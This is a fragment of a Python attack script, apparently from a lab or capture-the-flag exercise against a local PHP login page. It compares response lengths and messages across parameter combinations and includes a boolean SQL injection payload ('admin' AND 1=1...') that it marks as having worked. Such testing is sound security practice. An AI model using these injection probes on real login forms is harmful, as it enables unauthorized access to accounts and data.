    if not has_fail_msg:
        print(f"[!] SUCCESS! Full response:")
        print(resp.text)
        break

import requests

url = "http://127.0.0.1:32960/index.php"

print("=== Analyzing Response Length Differences ===\n")

# Baseline - empty/no params
resp_empty = requests.get(url)
print(f"No params: Length={len(resp_empty.text)}")

# Only username
resp_user = requests.get(url, params={'username': 'admin'})
print(f"Only username: Length={len(resp_user.text)}")

# Only password
resp_pass = requests.get(url, params={'password': 'admin'})
print(f"Only password: Length={len(resp_pass.text)}")

# Both params with empty values
resp_both_empty = requests.get(url, params={'username': '', 'password': ''})
print(f"Both empty: Length={len(resp_both_empty.text)}")

# Both with values (failed login)
resp_both = requests.get(url, params={'username': 'admin', 'password': 'wrong'})
print(f"Both with values: Length={len(resp_both.text)}")

# The SQLi that WORKED
resp_sqli_worked = requests.get(url, params={'username': "admin' AND 1=1 AND '1'='1", 'password': 'x'})
print(f"SQLi (admin' AND 1=1 AND '1'='1'): Length={len(resp_sqli_worked.text)}")

# Extract the h3 message from each
import re

for name, resp in [
    ("Empty params", resp_empty),
    ("Only username", resp_user),
    ("Only password", resp_pass),
    ("Both empty", resp_both_empty),
    ("Both wrong", resp_both),
    ("SQLi", resp_sqli_worked)
]:
    match = re.search(r'<h3>(.*?)</h3>', resp.text, re.DOTALL)
    if match:
        msg = match.group(1).strip()
    else:
        msg = "No h3 message found"
    print(f"\n{name}: {msg}")

